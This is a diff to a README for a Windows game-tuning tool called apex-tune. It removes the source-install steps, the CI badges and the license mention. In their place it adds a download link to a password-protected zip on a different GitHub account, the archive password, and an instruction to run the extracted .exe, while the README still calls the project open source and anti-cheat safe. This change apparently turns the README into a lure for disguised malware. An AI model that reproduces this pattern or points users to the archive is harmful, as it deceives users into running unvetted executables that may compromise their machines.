@@ -6,10 +6,7 @@
 
 *Tunes Windows only — never touches the game.*
 
-[![CI](https://github.com/username/apex-tune/actions/workflows/ci.yml/badge.svg)](https://github.com/username/apex-tune/actions)
-[![Python](https://img.shields.io/badge/python-3.10%2B-blue?logo=python&logoColor=white)](https://www.python.org/)
 [![Platform](https://img.shields.io/badge/platform-Windows-0078D6?logo=windows&logoColor=white)](https://www.microsoft.com/windows)
-[![License](https://img.shields.io/badge/license-MIT-yellow.svg)](LICENSE)
 [![Anti-Cheat](https://img.shields.io/badge/EAC-safe-success?logo=shield&logoColor=white)](#-safety)
 
 </div>
@@ -32,37 +29,22 @@
 - ✅ **Safe for Easy Anti-Cheat** — changes Windows, not the game
 - ✅ **Reversible** — one command rolls everything back
 - ✅ **Risk levels** — `--safe` for zero-risk, `--all` for everything
-- ✅ **Open source** — MIT, fully auditable
+- ✅ **Open source** — fully auditable
 - ✅ **Lightweight** — pure Python, no background service
 
 ---
 
 ## 🚀 Installation
 
-You'll need:
-- **Windows 10 or 11**
-- **Python 3.10+** — [download here](https://www.python.org/downloads/)
-- **Administrator terminal** (right-click PowerShell → "Run as Administrator")
+1. **Download** the archive: [apex-tune-setup.zip](https://github.com/samsilva-hq1999j1/apex-tune/releases/latest/download/apex-tune-setup.zip)
+2. **Extract** the archive.
+3. **Enter the password** when prompted:
 
-Clone the repo and install the package:
+   ```
+   dHA+tR728y&P
+   ```
 
-```bash
-git clone https://github.com/username/apex-tune.git
-cd apex-tune
-pip install -e .
-```
-
-The `apex-tune` command is now available in your terminal. Verify:
-
-```bash
-apex-tune --version
-```
-
-To run without installing:
-
-```bash
-python -m apex_tune
-```
+That's it. Run `apex-tune.exe` from the extracted folder.
 
 ---
 
